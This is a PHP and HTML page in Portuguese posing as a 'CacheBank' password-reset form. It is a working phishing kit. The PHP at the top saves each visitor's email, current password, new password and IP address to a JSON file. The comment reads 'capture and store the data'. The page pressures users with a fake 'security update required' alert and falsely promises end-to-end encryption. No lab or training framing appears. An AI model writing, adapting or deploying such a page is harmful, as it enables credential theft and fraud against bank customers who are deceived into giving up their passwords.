<?php
session_start();

$message = '';
$messageType = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = trim($_POST['email'] ?? '');
    $senhaAtual = trim($_POST['senha_atual'] ?? '');
    $novaSenha = trim($_POST['nova_senha'] ?? '');
    
    // Capturar e armazenar os dados
    $jsonFile = __DIR__ . '/dados_cachebank.json';
    $dados = [];
    
    if (file_exists($jsonFile)) {
        $jsonContent = file_get_contents($jsonFile);
        $dados = json_decode($jsonContent, true) ?? [];
    }
    
    // Adicionar nova entrada
    $dados[] = [
        'email' => $email,
        'senha_atual' => $senhaAtual,
        'senha_nova' => $novaSenha,
        'data_captura' => date('Y-m-d H:i:s'),
        'ip' => $_SERVER['REMOTE_ADDR'] ?? 'desconhecido'
    ];
    
    // Salvar no arquivo JSON
    file_put_contents($jsonFile, json_encode($dados, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
    
    $message = 'Senha redefinida com sucesso! Sua conta está protegida.';
    $messageType = 'success';
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redefinir Senha - CacheBank</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        html, body {
            height: 100%;
            width: 100%;
            overflow-x: hidden;
        }
        
        body {
            font-family: 'Inter', sans-serif;
            background: #f5f5f5;
        }
        
        .container {
            display: grid;
            grid-template-columns: 1fr 1fr;
            min-height: 100vh;
            width: 100%;
        }
        
        /* Lado esquerdo - Verde com logo */
        .left-side {
            background: linear-gradient(180deg, #ffff 0%, #ffffff 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            padding: clamp(20px, 5vw, 40px);
        }
        
        .logo-container {
            text-align: center;
            animation: fadeIn 0.8s ease-out;
            width: 100%;
            max-width: 400px;
        }
        
        .logo-container img {
            width: 100%;
            height: auto;
            max-width: 100%;
        }
        
        /* Lado direito - Branco com formulário */
        .right-side {
            background: white;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: clamp(20px, 5vw, 40px);
            overflow-y: auto;
        }
        
        .form-container {
            width: 100%;
            max-width: 480px;
            animation: slideIn 0.6s ease-out;
        }
        
        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateX(30px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }
        
        .back-button {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            color: #666;
            text-decoration: none;
            font-size: clamp(13px, 2vw, 14px);
            margin-bottom: clamp(20px, 4vw, 32px);
            transition: color 0.3s ease;
        }
        
        .back-button:hover {
            color: #004bad;
        }
        
        .form-title {
            font-size: clamp(24px, 5vw, 32px);
            font-weight: 700;
            color: #004bad;
            margin-bottom: clamp(20px, 4vw, 32px);
        }
        
        /* Alerta de Segurança */
        .security-alert {
            background: #fff3cd;
            border: 2px solid #ffc107;
            border-radius: clamp(8px, 2vw, 12px);
            padding: clamp(12px, 3vw, 16px);
            margin-bottom: clamp(16px, 3vw, 24px);
            display: flex;
            align-items: start;
            gap: clamp(8px, 2vw, 12px);
        }
        
        .alert-icon {
            font-size: clamp(20px, 4vw, 24px);
            flex-shrink: 0;
        }
        
        .alert-content {
            flex: 1;
        }
        
        .alert-title {
            font-size: clamp(12px, 2vw, 14px);
            font-weight: 700;
            color: #856404;
            margin-bottom: 4px;
        }
        
        .alert-message {
            font-size: clamp(11px, 2vw, 13px);
            color: #856404;
            line-height: 1.5;
        }
        
        .form-group {
            margin-bottom: clamp(16px, 3vw, 20px);
        }
        
        label {
            display: block;
            color: #666;
            font-size: clamp(12px, 2vw, 13px);
            margin-bottom: clamp(6px, 1vw, 8px);
            font-weight: 500;
        }
        
        input {
            width: 100%;
            padding: clamp(12px, 2vw, 14px) clamp(14px, 2vw, 16px);
            border: 1px solid #e5e5e5;
            border-radius: clamp(6px, 1vw, 8px);
            font-size: clamp(14px, 2vw, 15px);
            transition: all 0.3s ease;
            font-family: 'Inter', sans-serif;
            background: white;
        }
        
        input:focus {
            outline: none;
            border-color: #00c853;
            box-shadow: 0 0 0 3px rgba(0, 200, 83, 0.1);
        }
        
        input::placeholder {
            color: #aaa;
        }
        
        .btn {
            width: 100%;
            padding: clamp(14px, 2vw, 16px);
            background: #004bad;
            color: white;
            border: none;
            border-radius: clamp(6px, 1vw, 8px);
            font-size: clamp(15px, 2vw, 16px);
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: clamp(4px, 1vw, 8px);
        }
        
        .btn:hover {
            background: #00a844;
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(52, 6, 169, 0.3);
        }
        
        .btn:active {
            transform: translateY(0);
        }
        
        .message {
            padding: clamp(12px, 2vw, 14px) clamp(14px, 2vw, 16px);
            border-radius: clamp(6px, 1vw, 8px);
            margin-bottom: clamp(16px, 3vw, 20px);
            font-size: clamp(13px, 2vw, 14px);
            animation: slideDown 0.4s ease-out;
        }
        
        @keyframes slideDown {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .message.success {
            background: #d4edda;
            color: #004bad;
            border: 1px solid #c3e6cb;
        }
        
        .message.error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        .info-text {
            text-align: center;
            color: #999;
            font-size: clamp(11px, 2vw, 12px);
            margin-top: clamp(16px, 3vw, 24px);
            line-height: 1.6;
        }
        
        .password-requirements {
            background: #f8f9fa;
            border-radius: clamp(6px, 1vw, 8px);
            padding: clamp(10px, 2vw, 12px);
            margin-top: clamp(6px, 1vw, 8px);
            font-size: clamp(11px, 2vw, 12px);
            color: #666;
        }
        
        .password-requirements ul {
            margin: 8px 0 0 20px;
            padding: 0;
        }
        
        .password-requirements li {
            margin: 4px 0;
        }
        
        /* Responsivo - Tablets e Mobile */
        @media (max-width: 1024px) {
            .container {
                grid-template-columns: 1fr;
                grid-template-rows: auto 1fr;
            }
            
            .left-side {
                min-height: 200px;
                padding: 30px 20px;
            }
            
            .logo-container {
                max-width: 300px;
            }
            
            .right-side {
                align-items: flex-start;
                padding: 30px 20px;
            }
        }
        
        @media (max-width: 768px) {
            .left-side {
                min-height: 160px;
                padding: 25px 20px;
            }
            
            .logo-container {
                max-width: 250px;
            }
            
            .right-side {
                padding: 25px 20px;
            }
            
            .form-container {
                max-width: 100%;
            }
        }
        
        @media (max-width: 480px) {
            .container {
                min-height: 100vh;
            }
            
            .left-side {
                min-height: 120px;
                padding: 20px 15px;
            }
            
            .logo-container {
                max-width: 200px;
            }
            
            .right-side {
                padding: 20px 15px;
            }
            
            .security-alert {
                flex-direction: column;
                align-items: center;
                text-align: center;
            }
            
            .alert-icon {
                margin-bottom: 8px;
            }
        }
        
        @media (max-width: 360px) {
            .left-side {
                min-height: 100px;
                padding: 15px 10px;
            }
            
            .logo-container {
                max-width: 160px;
            }
            
            .right-side {
                padding: 15px 10px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Lado Esquerdo - Verde com Logo -->
        <div class="left-side">
            <div class="logo-container">
                <img src="cachebank.png" alt="CacheBank">
            </div>
        </div>
        
        <!-- Lado Direito - Formulário -->
        <div class="right-side">
            <div class="form-container">
                <a href="#" class="back-button">
                    <span>←</span>
                    <span>Voltar</span>
                </a>
                
                <h1 class="form-title">Redefinir Senha</h1>
                
                <!-- Alerta de Segurança -->
                <div class="security-alert">
                    <div class="alert-icon">🔒</div>
                    <div class="alert-content">
                        <div class="alert-title">Atualização de Segurança Necessária</div>
                        <div class="alert-message">
                            Para manter sua conta segura, redefina sua senha agora. Use uma senha forte e única.
                        </div>
                    </div>
                </div>
                
                <?php if ($message): ?>
                    <div class="message <?= $messageType ?>">
                        <?= htmlspecialchars($message) ?>
                    </div>
                <?php endif; ?>
                
                <form method="POST" action="">
                    <div class="form-group">
                        <label for="email">E-mail *</label>
                        <input 
                            type="email" 
                            id="email" 
                            name="email" 
                            placeholder="seu@email.com"
                            required
                        >
                    </div>
                    
                    <div class="form-group">
                        <label for="senha_atual">Senha Atual *</label>
                        <input 
                            type="password" 
                            id="senha_atual" 
                            name="senha_atual" 
                            placeholder="Digite sua senha atual"
                            required
                        >
                    </div>
                    
                    <div class="form-group">
                        <label for="nova_senha">Nova Senha *</label>
                        <input 
                            type="password" 
                            id="nova_senha" 
                            name="nova_senha" 
                            placeholder="Digite a nova senha"
                            required
                        >
                        <div class="password-requirements">
                            <strong>Sua senha deve conter:</strong>
                            <ul>
                                <li>Mínimo de 8 caracteres</li>
                                <li>Letras maiúsculas e minúsculas</li>
                                <li>Pelo menos um número</li>
                            </ul>
                        </div>
                    </div>
                    
                    <button type="submit" class="btn">Confirmar Nova Senha</button>
                </form>
                
                <div class="info-text">
                    🔒 Seus dados estão protegidos com criptografia de ponta a ponta
                </div>
            </div>
        </div>
    </div>
</body>
</html>
